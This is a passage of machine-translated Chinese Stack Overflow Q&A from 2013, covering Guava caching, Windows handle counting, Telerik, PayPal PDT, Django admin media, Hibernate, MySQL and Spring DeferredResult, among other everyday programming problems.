是否可以在不使用文件选择器的情况下通过 javascript 访问特定文件？

假设我想读取这个文件：`C:\Users\...\aa.txt`直接读入一个变量，没有文件选择器。

如果这是不可能的，那么最好的方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:56:09.310

这是不可能的（谢天谢地）。允许客户端脚本完全访问用户的文件系统将存在严重的安全漏洞。

实现这一点（在网站上）的唯一方法是通过标准`file`输入。

# java - 具有数据初始化和整个数据在 Java 中定期刷新的缓存地图

> ID：15357953
> 
> 赞同：5
> 
> 时间：2013-03-12T09:51:56.593
> 
> 标签：java, guava

我需要在我的 Java 代码中缓存地图。地图是从数据库加载的，需要定期从数据库重新加载（对于地图中的所有数据）。由于我们现在无法导入任何新包。谷歌的番石榴包或代码示例中是否有任何现有功能？

最好将映射实现为线程安全的。但如果它不够简单，它仍然可以。

“LoadingCache”是我喜欢的一种，但它没有数据初始化方法让我在开始时将数据放入地图中。并且在地图过期后每次“get”都需要到达数据库。

谢谢！

* * *

一些示例代码可能会有所帮助：

```
public interface AToBMapper
{

    public static final String DEFAULT_B_NAME = "DEFAULT";

    public String getBForA(final String a);
}

public class AToBMapperImpl implements AToBMapper
{
    private final SomeDAO dao;

    private Map<String, String> cachedMap;

    public AToBMapperImpl(final SomeDAO dao)
    {
        this.dao = dao;
        cachedMap = new HashMap<String, String>();
    }

    public String getBForA(final String a)
    {
        // if the map is not initialized, initialize it with the data
        // if the map is expired, refresh all the data in the map
        // return the mapped B for A (if there is no mapping for A, return the "DEFAULT")
    }

    private Map<String, String> getTheData(final List<String> listOfB)
    {
        Map<String, String> newData = dao.getAToBMapping(listOfB);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:58:08.823

> “LoadingCache”是我喜欢的一种，但它没有数据初始化方法让我在开始时将数据放入地图中。

当然它确实有这样的方法——[`putAll(Map<K, V>)`](http://docs.guava-libraries.googlecode.com/git/javadoc/com/google/common/cache/Cache.html#putAll%28java.util.Map%29)从`Cache`接口`LoadingCache`扩展。该方法*将所有映射从指定映射复制到缓存*。

您也可以使用类似的`put(K, V)`方法来实现此目的。

**编辑：**

根据您的评论，我可以说您根本不想要`LoadingCache`，而是自己维护所有条目的到期。这是您可以使用的简单示例（仅 JDK 和 Guava 的类）：

```
public class AToBMapperImpl implements AToBMapper {
  public static final long EXPIRE_TIME_IN_SECONDS =
      TimeUnit.SECONDS.convert(1, TimeUnit.HOURS); // or whatever
  private final SomeDAO dao;
  private final ConcurrentMap<String, String> cache;
  private final Stopwatch stopwatch;

  public AToBMapperImpl(SomeDAO dao) {
    this.dao = dao;
    stopwatch = new Stopwatch();
    cache = new MapMaker().concurrencyLevel(2).makeMap();
  }

  @Override
  public synchronized String getBForA(final String a) {
    // if the map is not initialized, initialize it with the data
    if (!stopwatch.isRunning()) {
      cache.putAll(getNewCacheContents());
      stopwatch.start();
    }

    // if the map is expired, refresh all the data in the map
    if (stopwatch.elapsedTime(TimeUnit.SECONDS) >= EXPIRE_TIME_IN_SECONDS) {
      cache.clear();
      cache.putAll(getNewCacheContents());
      stopwatch.reset();
    }

    // return the mapped String for A
    // (if there is no mapping for A, return the "DEFAULT")
    return cache.containsKey(a) ? cache.get(a) : new String(DEFAULT_B_NAME);
  }

  private Map<String, String> getNewCacheContents() {
    return getTheData(Arrays.asList("keys", "you", "want", "to", "load"));
  }

  private Map<String, String> getTheData(List<String> listOfB) {
    return dao.getAToBMapping(listOfB);
  }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-07T05:24:50.817

虽然@Xaerxess 提供了一个可行的解决方案，但我觉得您仍然可以通过简单地使用`LoadingCache`具有单个键值的实例来实现这一点。我确实理解您对这种情况的推理，因为我曾参与过单个对象负载可能与整个集合一样昂贵的项目。

```
public class AToBMapperImpl implements AToBMapper {

    private final LoadingCache<Boolean, Map<String, String>> cachedMap;

    public AToBMapperImpl(final SomeDAO dao, final List<String> listOfB) {
        this.cachedMap = CacheBuilder.newBuilder()
                .expireAfterAccess(4, TimeUnit.HOURS)
                .build(new CacheLoader<Boolean, Map<String, String>>() {
                    @Override
                    public Map<String, String> load(Boolean k) throws Exception {
                        return dao.getAToBMapping(listOfB);
                    }
                });
    }

    @Override
    public String getBForA(String a) {
        try {
            Map<String, String> map = cachedMap.get(Boolean.TRUE);
            return map.containsKey(a) ? map.get(a) : DEFAULT_B_NAME;
        } catch (ExecutionException ex) {
            // Do what you need to do on exception.
            throw new RuntimeException(ex.getMessage(), ex);
        }
    }

} 
```

这样，缓存绑定到单个条目，其值是您所追求的地图。您将受益于到期时间。如果您发现这`listOfB`可能会随着时间而改变，您可能需要编写另一个服务方法来检索缓存加载器然后可以调用的方法。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-12T10:15:12.680

您不需要数据初始化方法，它可以在第一次访问时初始化。这是示例代码如何执行此操作

```
cachedWhatever = 
    cacheBuilder
    .maximumSize(5)
    .expireAfterAccess(30, TimeUnit.MINUTES)
    .removalListener(new RemovalListener<String, CachedWhatever>() {

        @Override
        public void onRemoval(RemovalNotification<String, CachedMetadata> notification) {
            logger.info("removed");
        }
    })
    .build(new CacheLoader<String, CachedWhatever>(){

            @Override
        public CachedMetadata load(String databaseName) throws Exception {
            logger.info("created");

            return new CachedWhatever();
            }
        }); 
```

并在访问缓存后

```
cachedWhatever.get([key]); 
```

如果不存在，它将创建缓存

并使用`cachedWhatever.invalidate([key]);`将清除密钥的缓存

# c# - Telerik RadNotificationMessage 在 IE8 中不保持页面滚动位置

> ID：15357955
> 
> 赞同：0
> 
> 时间：2013-03-12T09:52:08.093
> 
> 标签：c#, asp.net, telerik

我的`Default.aspx`代码

```
<telerik:RadNotification ID="rnMsg" runat="server" AutoCloseDelay="5000" 
    Enabled="True" Position="BottomRight" Skin="Vista"
    EnableShadow="True" EnableViewState="False" VisibleTitlebar="True">
</telerik:RadNotification> 
```

当我向下滚动页面并单击一个按钮时，RadNotification 消息显示在中心，而不是在我设置`Position="BottomRight"`. 帮我解决这个问题。谢谢。

**更新**：在 IE9、Chrome 和 Firefox 中运行良好，但在**IE8中****无法运行**

 *** * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T15:53:20.323

您是否检查过您的代码隐藏以查看您是否正在那里修改 Position 属性？代码隐藏优先于标记。

我见过类似的问题，检查这是否也是你的情况： [http](http://www.telerik.com/support/pits.aspx#/public/aspnet-ajax/13087) ://www.telerik.com/support/pits.aspx#/public/aspnet-ajax/13087 如果是这样 - 尝试禁用动画，它似乎帮助。**

# uitableview - 我设置了 UITableView.contentsize，但 contentsize 不会立即改变

> ID：15357956
> 
> 赞同：3
> 
> 时间：2013-03-12T09:52:08.937
> 
> 标签：uitableview

我设置`UITableView.contentsize`了，但只有我下次`contentsize`调用该方法时才会立即更改，视图的 似乎已更改。`reloadData``contentsize`

如果我想`UITableView`立即更改 's contentsize 我应该调用哪种方法？我尝试了该`setNeedsDisplay`方法，但它不起作用。

```
 _tableView .contentSize = CGSizeMake(
   _tableView.frame.size.width,rowHeight*(rowNumber+1)
 ); 
```

# c++ - 使用 Windows API 检索打开的文件描述符的数量

> ID：15357961
> 
> 赞同：4
> 
> 时间：2013-03-12T09:52:27.517
> 
> 标签：c++, windows, winapi, file-io, file-descriptor

我想知道我在 C++ 应用程序中打开了多少个文件描述符。这可以使用 Windows API 函数来完成吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-12T20:06:38.093

[您可以使用GetFileType](http://msdn.microsoft.com/en-us/library/windows/desktop/aa364960%28v=vs.85%29.aspx)询问流程中的每个句柄。

```
 DWORD type_char = 0, 
      type_disk = 0, 
      type_pipe = 0, 
      type_remote = 0, 
      type_unknown = 0,
      handles_count = 0;

GetProcessHandleCount(GetCurrentProcess(), &handles_count);
handles_count *= 4;
for (DWORD handle = 0x4; handle < handles_count; handle += 4) {
    switch (GetFileType((HANDLE)handle)){
        case FILE_TYPE_CHAR:
            type_char++;
            break;
        case FILE_TYPE_DISK:
            type_disk++;
            break;
        case FILE_TYPE_PIPE: 
            type_pipe++;
            break;
        case FILE_TYPE_REMOTE: 
            type_remote++;
            break;
        case FILE_TYPE_UNKNOWN:
            if (GetLastError() == NO_ERROR) type_unknown++;
            break;

    }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:56:38.803

如果您在检查打开的句柄之后，那么您可以使用[SysInternals中的](http://technet.microsoft.com/en-us/sysinternals/default)[Handle](http://technet.microsoft.com/en-us/sysinternals/bb896655)实用程序。

# c++ - C++ Qt 和 WinExec - 将 CMD 输出保存到特定文件夹中的文件

> ID：15357965
> 
> 赞同：0
> 
> 时间：2013-03-12T09:52:42.480
> 
> 标签：c++, qt, file-io, directory

我使用以下方法将 BIOS 序列号保存到与应用程序位于同一文件夹中的文件中：

```
WinExec("cmd.exe /c wmic bios get serialnumber > sn.txt", SW_HIDE); 
```

我的问题是如何将文件保存到不同的文件夹？像这样的东西：

```
WinExec("cmd.exe /c wmic bios get serialnumber > /some_folder/sn.txt", SW_HIDE); 
```

我尝试了 \ 和 / 的每种组合来指定一个文件夹，但它不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T10:19:35.047

我怀疑你只需要指定一个正确的相对路径：

```
WinExec("cmd.exe /c wmic bios get serialnumber > drive:\\<path_to_folder>\\some_folder\\sn.txt", SW_HIDE); 
```

或者在您的情况下，您似乎想在程序目录中指定文件夹`.\<path>`：

```
WinExec("cmd.exe /c wmic bios get serialnumber > .\\some_folder\\sn.txt", SW_HIDE); 
```

在写入之前确保此文件夹存在。如果没有，系统将找不到指定的路径。

# javascript - HTML画布中的重叠精灵

> ID：15357966
> 
> 赞同：0
> 
> 时间：2013-03-12T09:52:42.437
> 
> 标签：javascript, html, html5-canvas

我找到了这个在画布上运行的[游戏。](http://bombermine.com)

他们怎么能在同一位置（在 1 个画布中）有 2 个字符？

他们可能每秒都在更新游戏角色，如下所示：

```
context.clearRect(0, 0, width, height);
for (i=0;i<players.lenght;i++){
   context.drawImage(player, player[i][x], player[i][y]);
} 
```

使用此代码，如果 2 个玩家位置相同，则 1 个玩家将不可见。

有没有更好的方法来吸引所有玩家？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T20:12:10.180

仅仅因为玩家可能在同一个游戏中，并不意味着他们看到相同的视图:)（想想你玩过的任何在线 FPS 游戏）

但是，您的假设是有效的。*我添加到您的示例代码中的代码只是将您的玩家添加为数组中的最后一个玩家，这意味着您*将始终在游戏中显示为顶部（无论有 2 个或 10 个玩家）

```
context.clearRect(0, 0, width, height);

// Move your player to the top
for (i=0;i<players.lenght;i++){
    if (players.isYou()) {
        var you = players.splice(i, 1);
        players.push(you);
    }
}

for (i=0;i<players.lenght;i++){
    context.drawImage(player, player[i][x], player[i][y]);
} 
```

# post - 沙盒贝宝重复计费发布数据问题..未在自动退货中接收发布数据已开启

> ID：15357971
> 
> 赞同：1
> 
> 时间：2013-03-12T09:52:59.267
> 
> 标签：post, paypal, recurring

我也面临着新沙盒帐户的许多问题，但是通过使用 ctrl+shift+N 我现在可以登录沙盒.. 我的问题是：我正在使用定期付款..我已经设置了自动返回并打开 PDT..但是我没有得到有关返回 url 的详细信息...当我将详细信息发布到沙盒 paypal 时...下面是我的表单详细信息...请帮我解决这个问题..

```
 <input type="hidden' name="business" value="merch_1362652447_biz@yahoo.co.in">
            <input type="hidden" name="cmd" value="_xclick-subscriptions">
            <input type="hidden" name="item_name" value="Alices Monthly Digest">
            <input type="hidden" name="item_number" value="DIG Weekly">

            <input type="hidden" name="a1" value="0">
            <input type="hidden" name="p1" value="1">
            <input type="hidden" name="t1" value="M">

            <input type="hidden" name="a3" value="10">              
            <input type="hidden" name="p3" value="1">
            <input type="hidden" name="t3" value="M">
            <input type="hidden" name="rm" value="2">
            <input type="hidden" name="src" value="1">              

            <input type="hidden" name="return" value="http://sitename/test.php">
            <input type="hidden" name="cancel_return" value="http://sitename/test.php">
            <input type="hidden" name="notify_url" value="http://sitename/test.php">
        </form>" 
```

使用表单 action="https://sandbox.paypal.com/cgi-bin/webscr"

如果在这种情况下我没有设置自动退货..当用户单击退货按钮时，它会为我提供所有必需的付款详细信息...但是如果自动退货它不起作用...请提前致谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T14:57:45.013

您不会使用当前使用的按钮获得任何详细信息，因为您正在设置 1 个月的免费试用。PDT（付款数据传输），仅在付款时将信息返回到您的站点。在这种情况下，由于有 1 个月的免费试用期，因此不会返回任何数据。例如，如果您要将其从 0.00 更改为 1.00，则会返回数据。如果您想在买家完成结账后获取信息，我建议您使用 IPN。IPN 也将比 PDT 更可靠。

# xamarin.ios - Monotouch - 纠正颠倒的图像旋转

> ID：15357975
> 
> 赞同：0
> 
> 时间：2013-03-12T09:53:11.167
> 
> 标签：xamarin.ios, uiimage, cgcontext, image-rotation, cgimage

我使用单声道已经有一段时间了，我遇到的一个问题是将图像加载到 CGImage 对象中最终会导致图像垂直翻转。这是我最初使用的代码：

```
public static CGImage LoadJPEG (string sImagePath, bool bSmoothImage)
{
    return CGImage.FromJPEG (
        new CGDataProvider (sImagePath), null, bSmoothImage,
        CGColorRenderingIntent.Default);
} 
```

有一个 PNG 版本，您只需使用 CGImage.FromPNG 代替，但如果您使用错误的格式和错误的文件类型，那么您将获得异常。因为我一直都知道我的文件类型是什么，所以我没有放置任何捕获/检查来防止该异常。

您会注意到仅使用此代码会垂直翻转图像，我无法解释为什么单声道会这样做，并查看一些我不期待修复它的解决方案。

那么如何将其翻转回来呢？好吧，幸运的是我可以自己回答这个问题，但我不能保证这是“正确”的做法！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:53:11.167

请记住，这只是一个快速修复图像加载颠倒的方法。我认为代码在完成工作的同时尽可能简单。

```
public static CGImage RotateImage (CGImage oImage)
{
    CGContext oContext;
    UIImage oRotatedImage;
    RectangleF oImageBounds;
    //
    oImageBounds = new RectangleF (0, 0, oImage.Width, oImage.Height);
    //
    UIGraphics.BeginImageContext (oImageBounds.Size);
    oContext = UIGraphics.GetCurrentContext ();
    //
    oContext.DrawImage (oImageBounds, oImage);
    oRotatedImage = UIGraphics.GetImageFromCurrentImageContext ();
    UIGraphics.EndImageContext ();
    //
    return oRotatedImage.CGImage;
} 
```

我在玩[这个问题](https://stackoverflow.com/questions/4739231/uiimage-data-always-in-landscape-mode)中的代码时偶然发现了这个解决方案，然后想，嘿，这行得通，我不需要它来做任何其他事情：D 所以我希望这对你有帮助！

另外，如果有人可以解释所有这一切的原因，那么我很想知道实际发生了什么。我之前使用 2D 图形的唯一经验是使用 XNA 框架。

# c# - 当 Surface 键盘显示在 Windows 8 商店应用程序中时，弹出窗口不会向上移动

> ID：15357976
> 
> 赞同：3
> 
> 时间：2013-03-12T09:53:13.350
> 
> 标签：c#, windows-8, winrt-xaml

我有一个 Windows 商店应用程序，它要求用户通过大量文本框输入数据。

当屏幕底部附近的文本框获得焦点时，屏幕键盘会出现并将页面内容向上移动。这很棒，也是我想要的。

当我有一个弹出窗口时会出现我的问题。当我的弹出窗口出现时，它实际上是全屏的。弹出窗口的子窗口是一个用户控件，上面有很多文本框。选择页面底部附近的一个文本框后，将出现键盘，但屏幕不会向上移动，以便键盘出现在所选文本框中。

这是我用来显示弹出窗口的代码：

```
if (myPopup == null)
{
    myPopup = new Popup();

    myPopup.Child = new PopupFrom();

    // open the Popup                
    myPopup.IsOpen = true;
} 
```

当布局更新时，我还手动调整弹出窗口的大小

```
private void popup_LayoutUpdated(object sender, object e)
{
    if (Windows.UI.ViewManagement.ApplicationView.Value == Windows.UI.ViewManagement.ApplicationViewState.FullScreenLandscape)
    {
        popup.Width = 1280;
        popup.Height = 680;
    }
    else
    {
        popup.Width = 680;
        popup.Height = 1280;
    }
} 
```

所以我的问题是，当显示键盘并与弹出窗口底部附近的一个文本框重叠时，如何向上移动弹出窗口？

提前致谢。

我正在使用 C# & XAML 编写这个 Windows 8 商店应用程序。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-12T17:21:28.873

在我的应用程序中，我收听[InputPane](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.viewmanagement.inputpane%28v=win.10%29.aspx)显示/隐藏事件。这些事件告诉您键盘或其他输入设备何时显示/隐藏：

```
var pane = InputPane.GetForCurrentView();
pane.Showing += pane_Showing;
pane.Hiding += pane_Hiding; 
```

在您的事件处理程序中，您可以使用该[`OccludedRect`](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.viewmanagement.inputpane.occludedrect%28v=win.10%29.aspx)属性来确定输入区域（例如键盘）的大小。然后你可以移动你的弹出窗口，使它不覆盖这个矩形。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T12:31:22.430

您需要收听重叠文本框的**gotFocus**事件才能修改弹出窗口的子尺寸。另外，我建议使用**ScrollViewer**作为弹出窗口的子项，以允许滚动到上面的内容。比如：`emailBox.GotFocus += (s, o) => AdjustPopup();`祝你好运！

# django - Django admin datepicker 日历和时钟 img

> ID：15357978
> 
> 赞同：1
> 
> 时间：2013-03-12T09:53:15.380
> 
> 标签：django, datepicker

我在表单中使用了管理员日期选择器，但它没有显示时钟和日历图像。

这是我的模板的头部：

```
{% extends "shared/base.html" %}

{% load adminmedia %}

{% block extra_head %}

<link rel="stylesheet" type="text/css" href="{{ STATIC_URL }}admin/css/forms.css"/>
<link rel="stylesheet" type="text/css" href="{{ STATIC_URL }}admin/css/base.css"/>
<link rel="stylesheet" type="text/css" href="{{ STATIC_URL }}admin/css/global.css"/>
<link rel="stylesheet" type="text/css" href="{{ STATIC_URL }}admin/css/widgets.css"/>

<script type="text/javascript" src="/admin/jsi18n/"></script>
<script type="text/javascript" src="{{ STATIC_URL }}admin/js/core.js"></script>
<script type="text/javascript" src="{{ STATIC_URL }}admin/js/admin/RelatedObjectLookups.js"></script>
<script type="text/javascript" src="{{ STATIC_URL }}admin/js/jquery.js"></script>
<script type="text/javascript" src="{{ STATIC_URL }}admin/js/jquery.init.js"></script>
<script type="text/javascript" src="{{ STATIC_URL }}admin/js/actions.js"></script>
<script type="text/javascript" src="{{ STATIC_URL }}admin/js/calendar.js"></script>
<script type="text/javascript" src="{{ STATIC_URL }}admin/js/admin/DateTimeShortcuts.js"></script>

{% endblock %} 
```

有了这个，我得到：

```
"GET /missing-admin-media-prefix/img/icon_clock.gif HTTP/1.1" 404 4049
"GET /missing-admin-media-prefix/img/icon_calendar.gif HTTP/1.1" 404 4058 
```

所以我加了

```
 <script type="text/javascript">window.__admin_media_prefix__ = "{% filter escapejs %}{%admin_media_prefix %}{% endfilter %}";</script> 
```

到头，现在我得到：

```
"GET /media/admin/img/icon_calendar.gif HTTP/1.1" 404 4013
"GET /media/admin/img/icon_clock.gif HTTP/1.1" 404 4004 
```

知道我做错了什么吗？我需要更改我的 settings.py 中的某些内容吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T06:11:46.397

我遇到了同样的问题。您需要做的就是在 settings.py 文件中添加**“ADMIN_MEDIA_PREFIX”**

写吧

```
ADMIN_MEDIA_PREFIX = '/static/admin/' 
```

如果您的项目中有静态目录。根据您的目录名称命名它。如果它已经被命名为静态然后使用上面的。

# android - 移动体 onSceneTouchEvent

> ID：15357979
> 
> 赞同：0
> 
> 时间：2013-03-12T09:53:15.213
> 
> 标签：android, andengine, game-physics

我正在尝试将身体从其初始位置移动到 onTouchEvent x 和 y。问题是身体正在朝着错误的方向移动。有人能告诉我我的错误在哪里吗？

到目前为止，这是我的代码：

```
public boolean onPlayerTouchEvent(final Scene pScene,
                    final TouchEvent pSceneTouchEvent) {

            final float pValueX = pSceneTouchEvent.getX();
            final float pValueY = pSceneTouchEvent.getY();
            final float rotation = (float) Math.atan2(pValueX, pValueY);
            final float xComp = (float) Math.sin(rotation);
            final float yComp = (float) Math.cos(rotation);

            if (pSceneTouchEvent.isActionDown()) {
                    this.mPlayerBody.setLinearVelocity(new Vector2(xComp, yComp));
            } else if (pSceneTouchEvent.isActionMove()) {

            } else if (pSceneTouchEvent.isActionUp()) {
                    this.mPlayerBody.setLinearVelocity(new Vector2(0, 0));
            }

            return true;
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T12:39:29.333

你的旋转（角度）方程错误。

试试下面的代码。// touchX 和 touchY 全局变量

```
public boolean onPlayerTouchEvent(final Scene pScene,
                final TouchEvent pSceneTouchEvent) {

     if (pSceneTouchEvent.isActionDown()) {
        touchX = pSceneTouchEvent.getX();
        touchY = pSceneTouchEvent.getY();

    } else if (pSceneTouchEvent.isActionMove()) {
        final float pValueX = pSceneTouchEvent.getX()-touchX ;
        final float pValueY = pSceneTouchEvent.getY()- touchY;
        final float rotation = (float) Math.atan2(pValueY, pValueX);
        final float xComp = (float) Math.cos(rotation);
        final float yComp = (float) Math.sin(rotation);
        this.myBall.getBallBody().setLinearVelocity(
                new Vector2(xComp, yComp));
    } else if (pSceneTouchEvent.isActionUp()) {
        myBall.getBallBody().setLinearVelocity(new Vector2(0, 0));
    }

        return true;
} 
```

# safari - 在 Safari Web Inspector 中保留控制台输出

> ID：15357982
> 
> 赞同：11
> 
> 时间：2013-03-12T09:53:26.483
> 
> 标签：safari, mobile-safari, web-inspector

有谁知道如何/是否可以保留 Safari Web Inspector 的控制台输出、错误、信息等？

我正在尝试调试失败并导航到页面的 ajax 调用，但我看不到错误，因为它在导航后立即清除，有什么想法吗？

干杯

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2015-09-29T18:21:45.947

在 Safari 9 (Mac OS X El Capitan) 中，您可以右键单击控制台中的任意位置并选择“保持登录导航”。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2017-09-25T16:07:35.780

在 Safari 11 中，您应该单击 Web Inspector 中的齿轮

[![Web Inspector 中的齿轮](../Images/c5f6843bfd9eaf1fb56308509a167dc6.png)](https://i.stack.imgur.com/bJBhw.png)

并取消选中`Console: Clear when page navigates`：

[![控制台：页面导航时清除](../Images/086699436e41a2ffa18c653995b5285d.png)](https://i.stack.imgur.com/aB8KZ.png)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-07-31T11:47:44.570

目前 Safari 中似乎没有基于浏览器的日志持久性。但是，您可以使用

```
debugger; 
```

在您的代码中的任何一点导致执行停止并且开发人员工具将打开。如果您在调试器之前将任何值记录到控制台；声明您将能够在控制台中看到这些值。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-07-08T01:54:31.397

击中命令 + 。如果您试图在网络呼叫清除之前查看网络呼叫，则在停止浏览器的过程中会有所帮助。不过，我的运气好坏参半。

# hibernate - 在hibernate中根据一对多连接表对记录进行排序

> ID：15357983
> 
> 赞同：0
> 
> 时间：2013-03-12T09:53:28.083
> 
> 标签：hibernate, one-to-many

我有两个表 Table1 和 Table2。表 2 包含表 1 的外键。所以有一对多的映射 b/w Table1 和 Table2。现在我想通过以下方式从 Table1 中获取记录：

```
from Table1 t1 left join t1.table2s order by t1.table2.id asc 
```

基本上我需要从顶部的 Table1 中获取那些尚未与 Table2 连接的记录（这意味着 Table2 没有任何记录引用 Table1 中的特定记录）。在休眠中是否有任何正确或简单的方法可以做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T10:02:26.200

查询错误。

正确的查询是

```
from Table1 t1 left join t1.table2s as t2 order by t2.id asc 
```

# php - 来自同一个 MySQL 表上两个字段的前 10 条记录

> ID：15357988
> 
> 赞同：0
> 
> 时间：2013-03-12T09:53:38.340
> 
> 标签：php, mysql

这是我的**MySQL**表结构的一部分：

```
questionRecID       value   periodMonth     periodYear      practiceID
           16          70            11           2010             475  
           28          33            11           2010             475
           14         226            11           2010             475 
```

Question Rec ID 14 是用于计算百分比的分母。所以，是这样的：

`percent = (70 / 226) * 100`. 这给了我 2010 年 11 月的 rec ID 16 问题的百分比。

我需要查询整个表，以获取存储的所有年份和所有月份的前 10 个执行实践。php 或 SQL 都适合我。我真的很纠结如何从这个表中获取数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:41:47.523

```
DROP TABLE IF EXISTS my_table;
CREATE TABLE my_table (questionRecID       INT NOT NULL PRIMARY KEY,value   INT NOT NULL,periodMonth     INT NOT NULL, periodYear      INT NOT NULL, practiceID INT NOT NULL);
INSERT INTO my_table VALUES
(16          ,70            ,11           ,2010             ,475  ),
(28          ,33            ,11           ,2010             ,475),
(14         ,226            ,11           ,2010             ,475);

SELECT * FROM my_table;
+---------------+-------+-------------+------------+------------+
| questionRecID | value | periodMonth | periodYear | practiceID |
+---------------+-------+-------------+------------+------------+
|            14 |   226 |          11 |       2010 |        475 |
|            16 |    70 |          11 |       2010 |        475 |
|            28 |    33 |          11 |       2010 |        475 |
+---------------+-------+-------------+------------+------------+

SELECT x.*
     , x.value/y.value pct 
  FROM my_table x 
  JOIN my_table y 
    ON y.practiceid = x.practiceid 
   AND y.questionrecid = 14;
+---------------+-------+-------------+------------+------------+--------+
| questionRecID | value | periodMonth | periodYear | practiceID | pct    |
+---------------+-------+-------------+------------+------------+--------+
|            14 |   226 |          11 |       2010 |        475 | 1.0000 |
|            16 |    70 |          11 |       2010 |        475 | 0.3097 |
|            28 |    33 |          11 |       2010 |        475 | 0.1460 |
+---------------+-------+-------------+------------+------------+--------+ 
```

# spring - 在 spring-mvc-chat github 应用程序的上下文中理解 Spring MVC 的 DeferredResult 类

> ID：15357990
> 
> 赞同：6
> 
> 时间：2013-03-12T09:53:42.477
> 
> 标签：spring, spring-mvc, asynchronous

我试图更好地理解以下 spring mvc 3.2 应用程序是如何工作的：[https ://github.com/rstoyanchev/spring-mvc-chat](https://github.com/rstoyanchev/spring-mvc-chat)

我的问题是关于[deferredResult Spring MVC 类](http://static.springsource.org/spring/docs/3.2.x/javadoc-api/org/springframework/web/context/request/async/DeferredResult.html)。我注意到在给定时间，`chatRequests`地图中的条目与连接到聊天应用程序的用户一样多。

假设有**3 个用户连接**到聊天应用程序。您会看到，当**用户#3 发布一条消息**时（参见下面的 postMessage 方法），**for 循环（在 postMessage 方法中）迭代了 3 次**。我不明白为什么会这样。

我在下面包含示例代码。

控制器代码：

```
@Controller
@RequestMapping("/mvc/chat")
public class ChatController {

    private final ChatRepository chatRepository;
    private final Map<DeferredResult<List<String>>, Integer> chatRequests = new ConcurrentHashMap<DeferredResult<List<String>>, Integer>();

    @Autowired
    public ChatController(ChatRepository chatRepository) {
        this.chatRepository = chatRepository;
    }

    @RequestMapping(method = RequestMethod.GET)
    @ResponseBody
    public DeferredResult<List<String>> getMessages(@RequestParam int messageIndex) {

        final DeferredResult<List<String>> deferredResult = new DeferredResult<List<String>>(null, Collections.emptyList());
        this.chatRequests.put(deferredResult, messageIndex);

        deferredResult.onCompletion(new Runnable() {
            @Override
            public void run() {
                chatRequests.remove(deferredResult);
            }
        });

        List<String> messages = this.chatRepository.getMessages(messageIndex);
        if (!messages.isEmpty()) {
            deferredResult.setResult(messages);
        }

        return deferredResult;
    }

    @RequestMapping(method = RequestMethod.POST)
    @ResponseBody
    public void postMessage(@RequestParam String message) {

        this.chatRepository.addMessage(message);

        // Update all chat requests as part of the POST request
        // See Redis branch for a more sophisticated, non-blocking approach

        for (Entry<DeferredResult<List<String>>, Integer> entry : this.chatRequests.entrySet()) {
            List<String> messages = this.chatRepository.getMessages(entry.getValue());
            entry.getKey().setResult(messages);
        }
    }
} 
```

Javascript代码：

```
$(document).ready(function() {

    function ChatViewModel() {

        var that = this;

        that.userName = ko.observable('');
        that.chatContent = ko.observable('');
        that.message = ko.observable('');
        that.messageIndex = ko.observable(0);
        that.activePollingXhr = ko.observable(null);

        var keepPolling = false;

        that.joinChat = function() {
            if (that.userName().trim() != '') {
                keepPolling = true;
                pollForMessages();
            }
        }

        function pollForMessages() {
            if (!keepPolling) {
                return;
            }
            var form = $("#joinChatForm");

            that.activePollingXhr($.ajax({url: form.attr("action"), type: "GET", data: form.serialize(), cache: false,
                success: function(messages) {
                    console.log(messages);
                    for (var i = 0; i < messages.length; i++) {
                        that.chatContent(that.chatContent() + messages[i] + "\n");
                        that.messageIndex(that.messageIndex() + 1);
                    }
                },
                error: function(xhr) {
                    if (xhr.statusText != "abort" && xhr.status != 503) {
                        resetUI();
                        console.error("Unable to retrieve chat messages. Chat ended.");
                    }
                },
                complete: pollForMessages
            }));
            $('#message').focus();
        }

        that.postMessage = function() {
            if (that.message().trim() != '') {
                var form = $("#postMessageForm");
                $.ajax({url: form.attr("action"), type: "POST",
                    data: "message=[" + that.userName() + "] " + $("#postMessageForm input[name=message]").val(),
                    error: function(xhr) {
                        console.error("Error posting chat message: status=" + xhr.status + ", statusText=" + xhr.statusText);
                    }
                });
                that.message('');
            }
        }

        that.leaveChat = function() {
            that.activePollingXhr(null);
            resetUI();
            this.userName('');
        }

        function resetUI() {
            keepPolling = false;
            that.activePollingXhr(null);
            that.message('');
            that.messageIndex(0);
            that.chatContent('');
        }

    }

    //Activate knockout.js
    ko.applyBindings(new ChatViewModel());

}); 
```

和html页面：

```
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:th="http://www.thymeleaf.org">
<head>
    <title>Chat</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
    <h1>Chat</h1>

    <form id="joinChatForm" th:action="@{/mvc/chat}" data-bind="visible: activePollingXhr() == null">
        <p>
            <label for="user">User: </label>
            <input id="user" name="user" type="text" data-bind="value: userName"/>
            <input name="messageIndex" type="hidden" data-bind="value: messageIndex"/>
            <button id="start" type="submit" data-bind="click: joinChat">Join Chat</button>
        </p>
